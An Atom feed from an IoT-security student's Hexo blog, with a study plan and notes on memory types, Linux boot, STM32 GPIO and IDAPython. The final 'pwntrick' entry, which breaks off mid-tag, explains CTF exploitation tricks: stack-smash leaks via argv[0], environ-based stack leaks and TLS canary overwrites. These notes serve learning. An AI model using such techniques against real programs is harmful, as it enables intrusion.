<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lock&#39;s blog</title>
  
  
  <link href="/LawlietLW.github.io/atom.xml" rel="self"/>
  
  <link href="https://lawliet.ren/"/>
  <updated>2021-04-16T03:53:48.806Z</updated>
  <id>https://lawliet.ren/</id>
  
  <author>
    <name>Lock</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>学习计划</title>
    <link href="https://lawliet.ren/2021/04/16/xue-xi-ji-hua/"/>
    <id>https://lawliet.ren/2021/04/16/xue-xi-ji-hua/</id>
    <published>2021-04-16T02:20:43.000Z</published>
    <updated>2021-04-16T03:53:48.806Z</updated>
    
    <content type="html"><![CDATA[<p>太菜了，要学的东西还有好多，在此记录一下:</p><p>0.考研</p><p>1.CTF能力希望能继续精进，抽空得复现一些比赛的题目，学习新的利用方式。</p><p>2.ptmalloc的源码要抽时间再看看，一直都是哪里需要看哪里，只有片面的了解。</p><p>3.各种嵌入式web服务器(uhttpd，lighttpd，thttpd，mini_httpd，boa，goahead等等)的实现、架构需要学习，源码也得看看。</p><p>4.Linux操作也有很多要学。</p><p>5.AFL学习，虽然iot安全大部分都还是人工审计，但看了两篇文章后发觉afl在对特定组件进行fuzz时依然能够发挥作用，而且不一定只挖iot的洞，Linux平台下的漏洞都可以挖挖，多点开花才是最好的。</p><p>6.STM32学习，作为一个电子专业的学生，老本行不能忘，嵌入式得搞起来，正儿八经的安全研究员都是开发的好手(我猜的)，他们开发上层应用，我搞iot安全，也得学好底层开发（万一以后做不了安全了，说不定可以转行呢23333）.</p><p>7.AD制板，电子专业硬件软件两手抓，虽然我偏软件一些，但硬件也不能落下，本科阶段怎么着也得能熟练绘制2层PCB板才行，而且自己做硬件实现软件也有成就感。</p><p>8.固件打包技术，对于某些不能开shell的设备，可以在固件中添加自启动脚本开启telnetd，方便调试，我对这一块的操作知之甚少，还需要多学习。</p><p>9.IDApython，一直都是f5大法好，很羡慕能够随心所欲调用idapython的大佬们，争取以后多学学</p><p>10….未完待续，先学着吧，这10条(尤其是第0条)已经够我学的了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;太菜了，要学的东西还有好多，在此记录一下:&lt;/p&gt;
&lt;p&gt;0.考研&lt;/p&gt;
&lt;p&gt;1.CTF能力希望能继续精进，抽空得复现一些比赛的题目，学习新的利用方式。&lt;/p&gt;
&lt;p&gt;2.ptmalloc的源码要抽时间再看看，一直都是哪里需要看哪里，只有片面的了解。&lt;/p&gt;
&lt;p&gt;3.
      
    
    </summary>
    
    
      <category term="学习" scheme="https://lawliet.ren/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="学习计划" scheme="https://lawliet.ren/tags/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>iot的一点知识</title>
    <link href="https://lawliet.ren/2021/04/05/iot-de-yi-dian-zhi-shi/"/>
    <id>https://lawliet.ren/2021/04/05/iot-de-yi-dian-zhi-shi/</id>
    <published>2021-04-05T04:46:15.000Z</published>
    <updated>2021-04-05T13:20:17.209Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ROM、RAM、SRAM、DRAM、FLASH区别"><a href="#1-ROM、RAM、SRAM、DRAM、FLASH区别" class="headerlink" title="1.ROM、RAM、SRAM、DRAM、FLASH区别"></a>1.ROM、RAM、SRAM、DRAM、FLASH区别</h2><h3 id="1-ROM-Read-Only-Memory"><a href="#1-ROM-Read-Only-Memory" class="headerlink" title="1.ROM(Read Only Memory)"></a>1.ROM(Read Only Memory)</h3><p>ROM是只读存储器，掉电时可以保存数据： 只读存储器，在单片机运行时，只能从中读取数据，不能向里面写数据。特点是掉电不丢失数据，在单片机中主要用来存储代码和常量等内容。</p><p>EPROM(可擦除可编程ROM)是通过紫外光的照射擦除原先的程序，是一种通用的存储器。</p><p>EEPROM是通过电子擦出，价格很高，写入时间很长，写入很慢。</p><p>ROM所存数据稳定 ，断电后所存数据也不会改变，并且结构较简单，使用方便，因而常用于存储各种固定程序和数据</p><h3 id="2-RAM（Random-Access-Memory）随机存储器"><a href="#2-RAM（Random-Access-Memory）随机存储器" class="headerlink" title="2.RAM（Random Access Memory）随机存储器"></a>2.RAM（Random Access Memory）随机存储器</h3><p>可读可写，特点是掉电会丢失数据。</p><p>RAM又分为SRAM(Static RAM)和DRAM(Dynamic RAM)，SRAM是读写速度非常快的存储设备，但价格昂贵。DRAM比ROM速度快，但是比SRAM速度慢，价格低于SRAM，计算机内存使用的就是DRAM。</p><p>RAM在计算机和数字系统中用来暂时存储程序、数据和中间结果</p><h3 id="3-FLASH存储器"><a href="#3-FLASH存储器" class="headerlink" title="3.FLASH存储器"></a>3.FLASH存储器</h3><p>FLASH存储器又称闪存，它结合了ROM和RAM的长处，不仅具备电子可擦除可编程（EEPROM）的性能，还不会断电丢失数据，同时可以快速读取数据（NVRAM的优势）。</p><p>在嵌入式系统中，它用作存储Bootloader以及操作系统或者程序代码，或者直接当硬盘使用（U盘）。</p><p><strong>目前Flash主要有NOR Flash和NADN Flash：</strong><br>    <strong>NOR Flash的读取和我们常见的SDRAM的读取是一样，</strong>用户可以直接运行装载在NOR FLASH里面的代码，这样可以减少SRAM的容量从而节约了成本。<br>    <strong>NAND Flash</strong>没有采取内存的随机读取技术，它的读取是以一次读取一块的形式来进行的，通常是一次读取512个字节，采用这种技术的Flash比较廉价。用户不能直接运行NAND Flash上的代码，因此好多使用NAND Flash的开发板除了使用NAND Flash以外，还加上了一块小的NOR Flash来运行启动代码。</p><h2 id="2-Linux启动过程"><a href="#2-Linux启动过程" class="headerlink" title="2.Linux启动过程"></a>2.Linux启动过程</h2><p>第一步：开机自检，加载BIOS</p><p>第二步：读取ＭＢＲ</p><p>第三步：Boot Loader　grub引导菜单</p><p>第四步：加载kernel内核</p><p>第五步：init进程依据inittab文件夹来设定运行级别</p><p>第六步：init进程执行rc.sysinit</p><p>第七步：启动内核模块</p><p>第八步：执行不同运行级别的脚本程序</p><p>第九步：执行/etc/rc.d/rc.local</p><p>第十步：执行/bin/login程序，启动mingetty,进入登录状态</p><p>如果要添加Linux启动时要执行的命令，可以修改<strong>/etc/rc.d/rc.local</strong>文件</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-ROM、RAM、SRAM、DRAM、FLASH区别&quot;&gt;&lt;a href=&quot;#1-ROM、RAM、SRAM、DRAM、FLASH区别&quot; class=&quot;headerlink&quot; title=&quot;1.ROM、RAM、SRAM、DRAM、FLASH区别&quot;&gt;&lt;/a&gt;1.ROM
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>STM32学习(1)</title>
    <link href="https://lawliet.ren/2021/02/13/stm32-xue-xi-1/"/>
    <id>https://lawliet.ren/2021/02/13/stm32-xue-xi-1/</id>
    <published>2021-02-13T08:46:01.000Z</published>
    <updated>2021-04-16T03:54:43.491Z</updated>
    
    <content type="html"><![CDATA[<p>开始学习STM32，我买的开发板是正点原子的STM32F103ZET6战舰v3</p><p>相对比51，STM32的知识量要大出许多许多，这里学一点记一点吧。</p><p>1.STM32F103ZET6有144个引脚，7组IO口，每组IO有16个IO，一共7*16=112个IO</p><p>IO口从GPIOA一直到GPIOG，每组内的的IO从Px1-Px15</p><p>2.STM32的大部分IO除了用作GPIO的功能外，还可以复用为外设功能引脚，比如串口。</p><p>3.STM32的GPIO有8种工作模式，又分为4种输入模式，4种输出模式</p><p>4种输入模式为：</p><ul><li>输入浮空</li><li>输入上拉</li><li>输入下拉</li><li>模拟输入</li></ul><p>4种输出模式为</p><ul><li>开漏输出</li><li>开漏复用功能</li><li>推挽式输出</li><li>推挽式复用功能</li></ul><p>4.每组GPIO端口包括7个寄存器：</p><p>2个32位配置寄存器(GPIOx_CRL,GPIOx_CRH)，配置一个IO需要4位，因此一个寄存器能够配置8个IO，每组GPIO内有16个IO，因此需要两个32位的寄存器；CRL寄存器控制0-7的IO,CRH寄存器控制8-15的IO，寄存器配置图如下</p><p><a href="https://imgchr.com/i/ysSGvT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/ysSGvT.png" alt="ysSGvT.png"></a></p><p>通过MODEx[1:0]这两位来设置IO为输入或者输出，设置为00即为输入模式，设置为其他的值即为输出模式(翻转速率不一样)，当设置了IO输入或者输出后，可以设置CNFx[1:0]的值来设置具体的工作模式，即上面说的八种工作模式(注意，要设置IO为上拉或者下拉还需要设置ODR寄存器的值，当ODR寄存器相应的位为0时，即为下拉输入，为1时，即为上拉输入)。</p><p>2个32位数据寄存器(GPIOx_IDR,GPIOx_ODR)</p><p>GPIOx_IDR为端口输入数据寄存器，它用来读取IO口的输入(在输出模式下，这个寄存器也可以用来读取对应的IO口的输出值)，寄存器图如下</p><p><a href="https://imgchr.com/i/ysSvin" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/ysSvin.png" alt="ysSvin.png"></a></p><p>32位中只有低16位被使用，低16位的每一位都用来控制一个IO口，每一位的值就是对应IO口目前的状态；</p><p>GPIOx_ODR为端口输出寄存器，寄存器图如下</p><p><a href="https://imgchr.com/i/yspDoj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/yspDoj.png" alt="yspDoj.png"></a></p><p>和IDR寄存器一样，ODR寄存器也只有低16位被使用，每一位对应着一组IO口的一个IO，可以读取每一位的值来获取每一个IO的状态，也可以设置每一位的值来控制每一位IO的状态(通过GPIOx_BSRR来设置)。</p><p>1个32位置位/复位寄存器(GPIOx_BSRR)</p><p>GPIOx_BSRR是端口位设置/清除寄存器寄存器，寄存器图如下</p><p><a href="https://imgchr.com/i/ys9d91" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/ys9d91.png" alt="ys9d91.png"></a></p><p>这个寄存器一般只用低16位，也就是设置对应的ODRy位为1，将ODRy设置为0的操作则是由GPIOx_BRR寄存器来完成。</p><p>1个16位复位寄存器(GPIOx_BRR)</p><p>GPIOx_BRR为端口位清除寄存器，和GPIOx_BSRR相对应，GPIOx_BSRR用来设置ODRy位为1，而GPIOx_BRR设置为0，寄存器图如下</p><p><a href="https://imgchr.com/i/ys9yHe" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/ys9yHe.png" alt="ys9yHe.png"></a></p><p><a href="https://imgchr.com/i/ys9cAH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/02/13/ys9cAH.png" alt="ys9cAH.png"></a></p><p>GPIOx_BSRR和GPIOx_BRR这两个寄存器都只使用低16位寄存器。</p><p>1个32位锁定寄存器(GPIOx_LCKR)</p><p>下面记录如何点亮led</p><p>在学51单片机的时候，我们只需要将led对应的IO口设为高电平即可点亮，但stm32要麻烦一些。</p><p>我们知道，时钟是单片机的驱动源，单片机的外设想要工作的话必须打开其对应的时钟。在51单片机编程中我们使用一些外设并没有配置时钟，这是因为51单片机只要打开一个时钟源就能使用所有外设，而这个时钟源是默认开启的。但stm32不一样，它的所有时钟默认都是关闭的，我们要想使用某个外设都需要先使能其对应的时钟，才能进行下一步操作。</p><p>因此在stm32下点亮led有以下三个步骤：</p><ol><li>使能对应的GPIOx</li><li>初始化对应的GPIOx</li><li>给GPIOx_Pin_y设置相应的值</li></ol><p>还得再提一手stm32的系统架构，多的不谈，挑一点记录(其实只是因为我现在只学了这么点)</p><blockquote><p>APB1 和 APB2 的区别， APB1 上面连接的是低速外设，包括电源接口、<br>备份接口、 CAN、 USB、 I2C1、 I2C2、 UART2、 UART3 等等， APB2 上面连接的是高速外设包<br>括 UART1、 SPI1、 Timer1、 ADC1、 ADC2、所有普通 IO 口(PA~PE)、第二功能 IO 口等。居宁<br>老师的《稀里糊涂玩 STM32》资料里面教大家的记忆方法是 2&gt;1， APB2 下面所挂的外设的时<br>钟要比 APB1 的高。  </p></blockquote><p>再记录一些函数</p><pre><code>void GPIO_Init(GPIO_TypeDef* GPIOx, GPIO_InitTypeDef* GPIO_InitStruct)；IO口初始化库函数第一个参数为要初始化的IO，从GPIOA-GPIOG第二个参数为GPIO结构体，如下typedef struct{  uint16_t GPIO_Pin;             /*!&lt; Specifies the GPIO pins to be configured.                                      This parameter can be any value of @ref GPIO_pins_define */  GPIOSpeed_TypeDef GPIO_Speed为翻转速率，;  /*!&lt; Specifies the speed for the selected pins.                                      This parameter can be a value of @ref GPIOSpeed_TypeDef */  GPIOMode_TypeDef GPIO_Mode;    /*!&lt; Specifies the operating mode for the selected pins.                                      This parameter can be a value of @ref GPIOMode_TypeDef */}GPIO_InitTypeDef;GPIO_Pin为具体的IO，从GPIO_Pin_0-从GPIO_Pin_15;GPIO_Speed为翻转速率，GPIO_Mode为IO的工作模式</code></pre><p>未完待续。。。（不想写了，什么时候想写了再写吧）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开始学习STM32，我买的开发板是正点原子的STM32F103ZET6战舰v3&lt;/p&gt;
&lt;p&gt;相对比51，STM32的知识量要大出许多许多，这里学一点记一点吧。&lt;/p&gt;
&lt;p&gt;1.STM32F103ZET6有144个引脚，7组IO口，每组IO有16个IO，一共7*16=11
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>IDA7.5下的idapython使用</title>
    <link href="https://lawliet.ren/2021/01/25/ida7-5-xia-de-idapython-shi-yong/"/>
    <id>https://lawliet.ren/2021/01/25/ida7-5-xia-de-idapython-shi-yong/</id>
    <published>2021-01-25T06:42:05.000Z</published>
    <updated>2021-01-25T10:21:34.446Z</updated>
    
    <content type="html"><![CDATA[<p>开始学习IDApython的使用</p><p>网上的教程都是基于7.0版本的IDA，自IDA7.4之后，idapython的语法就有了变化，且由py2转移到了py3，所以需要对照着Hexray官方的说明来修改，<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml" target="_blank" rel="noopener">链接</a></p><p>跟着这个<a href="https://yunyawu.com/2020/06/28/ida-python%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">教程</a>一点点学习</p><blockquote><p>IDApython由三个独立模块组成，第一个是idc，它是封装IDA的IDA函数的兼容性模块，现在已经很少使用。第二个模块是idautils，这是IDA里的一个高级实用函数。第三个模块是idaapi，它允许访问更多低级的数据，这些数据能够被类使用通过IDA。</p></blockquote><h2 id="0x1-基础"><a href="#0x1-基础" class="headerlink" title="0x1.基础"></a>0x1.基础</h2><blockquote><p>.text:00012529  mov esi, [esp+4+arg_0]</p><p>.text是段名称，地址是00012529。mov是助记符，第一个操作是esi，第二个操作是[esp+4+arg_0]</p></blockquote><p><strong>ea=here()/idc.get_screen_ea</strong><br>获取当前光标所在位置的地址，返回一个16进制的整型值</p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>here<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0x40d478</span>Python<span class="token operator">></span>idc<span class="token punctuation">.</span>get_screen_ea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0x40d478</span>Python<span class="token operator">></span>type<span class="token punctuation">(</span>here<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span></code></pre><p><strong>ida_ida.inf_get_min_ea() 获取最小地址</strong></p><p><strong>ida_ida.inf_get_max_ea() 获取最大地址</strong></p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>ida_ida<span class="token punctuation">.</span>inf_get_min_ea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0x400000</span>Python<span class="token operator">></span>ida_ida<span class="token punctuation">.</span>inf_get_max_ea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token number">0x50c9fc</span>Python<span class="token operator">></span>type<span class="token punctuation">(</span>ida_ida<span class="token punctuation">.</span>inf_get_max_ea<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">></span></code></pre><p><strong>idc.get_segm_name()  获取当前段的名称</strong></p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>idc<span class="token punctuation">.</span>get_segm_name<span class="token punctuation">(</span>ea<span class="token punctuation">)</span><span class="token string">'.text'</span></code></pre><p><strong>idc.GetDisasm() 获取当前地址的指令</strong></p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>idc<span class="token punctuation">.</span>GetDisasm<span class="token punctuation">(</span>ea<span class="token punctuation">)</span><span class="token string">'li      $gp, unk_4EC460'</span></code></pre><p><strong>idc.print_insn_mnem 获取当前地址助记符</strong></p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>idc<span class="token punctuation">.</span>print_insn_mnem<span class="token punctuation">(</span>ea<span class="token punctuation">)</span><span class="token string">'li'</span></code></pre><p><strong>idc.print_operand 获取当前地址操作数</strong></p><pre class=" language-python"><code class="language-python">Python<span class="token operator">></span>idc<span class="token punctuation">.</span>print_operand<span class="token punctuation">(</span>ea<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token string">'$gp'</span>Python<span class="token operator">></span>idc<span class="token punctuation">.</span>print_operand<span class="token punctuation">(</span>ea<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'unk_4EC460'</span></code></pre><p><strong>idaapi.BADADDR 验证地址是否存在</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> idautils<span class="token keyword">import</span> idaapiea<span class="token operator">=</span>here<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ea<span class="token operator">!=</span>idaapi<span class="token punctuation">.</span>BADADDR<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'valid address'</span><span class="token punctuation">)</span></code></pre><p><strong>遍历所有段  idautils.Segments()返回一个遍历类型对象</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> idautils<span class="token keyword">import</span> idaapi<span class="token keyword">import</span> idc<span class="token keyword">for</span> seg <span class="token keyword">in</span> idautils<span class="token punctuation">.</span>Segments<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 0x%x 0x%x"</span><span class="token operator">%</span><span class="token punctuation">(</span>idc<span class="token punctuation">.</span>get_segm_name<span class="token punctuation">(</span>seg<span class="token punctuation">)</span><span class="token punctuation">,</span>idc<span class="token punctuation">.</span>get_segm_start<span class="token punctuation">(</span>seg<span class="token punctuation">)</span><span class="token punctuation">,</span>idc<span class="token punctuation">.</span>get_segm_end<span class="token punctuation">(</span>seg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>遍历所有已知函数 idautils.Functions()  idautils.Functions()将返回一个已知函数列表</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> idautils<span class="token keyword">import</span> idaapi<span class="token keyword">import</span> idc<span class="token keyword">for</span> func <span class="token keyword">in</span> idautils<span class="token punctuation">.</span>Functions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">,</span>idc<span class="token punctuation">.</span>get_func_name<span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>idaapi.get_func() 获取当前地址的函数</strong></p><p><strong>dir(class)查询python中类的有效函数</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> idautils<span class="token keyword">import</span> idaapi<span class="token keyword">import</span> idcfunc<span class="token operator">=</span>idaapi<span class="token punctuation">.</span>get_func<span class="token punctuation">(</span>ea<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start:0x%x end:0x%x"</span><span class="token operator">%</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>start_ea<span class="token punctuation">,</span>func<span class="token punctuation">.</span>end_ea<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dir<span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>idc.get_func_attr来获取下个指令的开始和继续，直到我们到达这个函数的末尾</strong></p><p><strong>idc.next_head来获取下个指令的开始和继续，直到我们到达这个函数的末尾</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> idautils<span class="token keyword">import</span> idaapi<span class="token keyword">import</span> idcea<span class="token operator">=</span>here<span class="token punctuation">(</span><span class="token punctuation">)</span>start<span class="token operator">=</span>idc<span class="token punctuation">.</span>get_func_attr<span class="token punctuation">(</span>ea<span class="token punctuation">,</span>FUNCATTR_START<span class="token punctuation">)</span>end<span class="token operator">=</span>idc<span class="token punctuation">.</span>get_func_attr<span class="token punctuation">(</span>ea<span class="token punctuation">,</span>FUNCATTR_END<span class="token punctuation">)</span>cur_addr<span class="token operator">=</span>start<span class="token keyword">while</span> cur_addr<span class="token operator">&lt;=</span>end<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>cur_addr<span class="token punctuation">)</span><span class="token punctuation">,</span>idc<span class="token punctuation">.</span>GetDisasm<span class="token punctuation">(</span>cur_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    cur_addr<span class="token operator">=</span>idc<span class="token punctuation">.</span>next_head<span class="token punctuation">(</span>cur_addr<span class="token punctuation">,</span>end<span class="token punctuation">)</span></code></pre><p><strong>idc.get_func_attr(ea, FUNCATTR_FLAGS) 收集有关于函数的信息</strong></p><pre><code></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;开始学习IDApython的使用&lt;/p&gt;
&lt;p&gt;网上的教程都是基于7.0版本的IDA，自IDA7.4之后，idapython的语法就有了变化，且由py2转移到了py3，所以需要对照着Hexray官方的说明来修改，&lt;a href=&quot;https://www.hex-rays.c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pwntrick</title>
    <link href="https://lawliet.ren/2021/01/02/pwntrick/"/>
    <id>https://lawliet.ren/2021/01/02/pwntrick/</id>
    <published>2021-01-02T03:24:31.000Z</published>
    <updated>2021-04-15T14:30:28.368Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下pwn的一些小技巧以及一些利用方式，想到哪个写哪个吧。</p><h2 id="0x1-stack-smashing-detected的利用"><a href="#0x1-stack-smashing-detected的利用" class="headerlink" title="0x1.stack smashing detected的利用"></a>0x1.stack smashing detected的利用</h2><p>stack smash技术的利用基础就是栈溢出导致canary被覆盖之后的报错流程</p><pre class=" language-c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>            msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span></code></pre><p>报错流程会打印出<code>__libc_argv[0]</code>的值，这个值是我们执行的文件的文件名，只需要找到文件名在栈中的位置然后通过溢出将其复改为我们想要泄露的值的地址即可。</p><p>ps：这个技术的利用场景通常是能够多次执行程序的情况下且溢出量要足够大。</p><h2 id="0x2-environ环境指针"><a href="#0x2-environ环境指针" class="headerlink" title="0x2.environ环境指针"></a>0x2.environ环境指针</h2><p>在 Linux 系统中，glibc 的环境指针 <code>environ(environment pointer)</code> 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p><p><a href="https://imgchr.com/i/rzHm3q" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2021/01/02/rzHm3q.png" alt="rzHm3q.png"></a></p><p><code>environ</code>地址的计算方法为<code>libc_base+libc.symbols['_environ']</code></p><h2 id="0x3-TLS结构体利用"><a href="#0x3-TLS结构体利用" class="headerlink" title="0x3.TLS结构体利用"></a>0x3.TLS结构体利用</h2><p>canary除了存在于栈上还会存在于TLS结构体中，TLS结构体如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the TCB.  Not necessarily the               thread descriptor used by libpthread.  */</span>  dtv_t <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  uintptr_t sysinfo<span class="token punctuation">;</span>  uintptr_t stack_guard<span class="token punctuation">;</span>  uintptr_t pointer_guard<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Bit 0: X86_FEATURE_1_IBT.     Bit 1: X86_FEATURE_1_SHSTK.   */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Reservation of some values for the TM ABI.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* GCC split stack support.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* The lowest address of shadow stack,  */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* Must be kept even if it is no longer used by glibc since programs,     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcbhead_t<span class="token punctuation">;</span></code></pre><p>其中<code>stack_guard</code>就是canary，可以通过超长栈溢出覆写tls结构体来绕过canary</p><p>如果是多线程程序，那么从TLS到<code>pthread_create</code>的函数参数传递栈帧的距离小于一页，这种情况可以直接通过超长栈溢出来修改canary。</p><p><a href="https://imgchr.com/i/rzztGF" target="_blank" rel="noopener"><img 